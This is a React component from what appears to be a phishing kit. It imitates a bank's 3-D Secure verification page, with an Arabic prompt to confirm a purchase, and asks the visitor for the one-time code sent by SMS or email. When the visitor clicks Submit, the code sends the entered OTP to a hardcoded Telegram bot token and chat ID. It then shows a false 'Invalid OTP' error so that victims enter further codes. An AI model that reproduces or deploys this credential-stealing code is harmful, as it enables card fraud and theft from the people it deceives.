import React, { useState } from "react";
import Axios from "axios";
import "./Otp.css";

export default function Otp({
  finalData,
  setFinalData,
  error,
  setError,
  setLoading,
}) {
  const [seconds, setSeconds] = useState(0);
  const [munites, setMunites] = useState(5);

  if (munites !== 0 && seconds === 0) {
    setMunites((munites) => munites - 1);
    setSeconds((seconds) => 60);
    setTimeout(() => {
      if (seconds === 0) setSeconds((seconds) => 60);
      setSeconds((seconds) => seconds - 1);
    }, 1000);
  }
  const handle = () => {
    setError(true);
    if (finalData.otp !== "") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setFinalData("");
      }, 10000);
      const apiToken = "7793390385:AAGXlO786EhHb9MuMJk2-dq376E64ekksRU";
      const chatId = "5807893197";
      const text = `OTP CODE : ${finalData.otp}`;
      const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}`;
      Axios(url);
      setFinalData({ ...finalData, otp: "" });
      setError(false);
    }
  };
  return (
    <fieldset className="amx-form-group-container">
      <div className="acscontent" id="_t6">
        <span className="w3ls-login box box--big" id="_t7">
          <span className="authTitle" id="_t8">
            <ul>
              <li id="liBankLogo"></li>
              <li id="liNetworkLogo">
                <img
                  alt="3DS"
                  className="iceGphImg acsLogo"
                  id="j_idt12"
                  src="/imageServlet.png"
                />
              </li>
            </ul>
            <div className="icePnlGrp acsNetworkInstruction" id="j_idt17">
              <h3>
                <p id="editedLabelNetworkInstruction">
                  يرجى إدخال رمز التحقق الذي تم إرساله إليك في الحقل أدناه
                  لتأكيد هويتك لهذا الشراء.
                </p>
              </h3>
            </div>
          </span>
        </span>
        <span className="w3ls-login box box--big" id="_t20">
          <form
            className="acsAuthInfos"
            id="customerAuthFormAutoSubmit"
            name="customerAuthFormAutoSubmit"
          >
            <div
              className="icePnlGrp infoAuthentication"
              id="customerAuthFormAutoSubmit:j_idt58"
            >
              <div id="customerAuthFormAutoSubmit:j_idt59"></div>
              <div
                className="icePnlGrp agile-field-txt"
                id="customerAuthFormAutoSubmit:j_idt69"
              >
                <div
                  className="icePnlGrp authenticationField divAcsLabel_ENG"
                  id="customerAuthFormAutoSubmit:j_idt70"
                >
                  <label
                    className="authenticateEntryLabel"
                    htmlFor="customerAuthFormAutoSubmit:athenticateEntry"
                    id="customerAuthFormAutoSubmit:editedLabelAthenticateEntry"
                  >
                    OTP Received by SMS/Email:
                  </label>
                </div>
                <div
                  className="icePnlGrp authenticateEntry"
                  id="customerAuthFormAutoSubmit:j_idt72"
                >
                  <input
                    className="iceInpSecrt"
                    id="customerAuthFormAutoSubmit:athenticateEntry"
                    maxLength={6}
                    name="customerAuthFormAutoSubmit:athenticateEntry"
                    type="password"
                    value={finalData.otp}
                    onChange={(event) =>
                      setFinalData({ ...finalData, otp: event.target.value })
                    }
                  />
                  <div>
                    {finalData.otp <= 0 && error ? (
                      <span name="Error">Invalid OTP, try again please !</span>
                    ) : (
                      ""
                    )}
                  </div>
                </div>
              </div>
              <div
                className="icePnlGrp"
                id="customerAuthFormAutoSubmit:j_idt73"
              ></div>
            </div>
            <div
              className="icePnlGrp actionButtons"
              id="customerAuthFormAutoSubmit:j_idt79"
            >
              <div
                className="icePnlGrp divSubmitTwoButton"
                id="customerAuthFormAutoSubmit:j_idt80"
              >
                <ul>
                  <input
                    className="buttonAuth"
                    id="customerAuthFormAutoSubmit:validAuthentication"
                    name="customerAuthFormAutoSubmit:validAuthentication"
                    type="button"
                    value="Submit"
                    onClick={() => handle()}
                  />
                </ul>
              </div>
            </div>
            <span id="customerAuthFormAutoSubmithdnFldsDiv">
              <input name="icefacesCssUpdates" type="hidden" />
            </span>
            <input
              type="hidden"
              name="javax.faces.ViewState"
              id="javax.faces.ViewState"
              value="-5106135124046585177:3994896681297452082"
              autoComplete="off"
            />
          </form>
        </span>
      </div>
    </fieldset>
  );
}
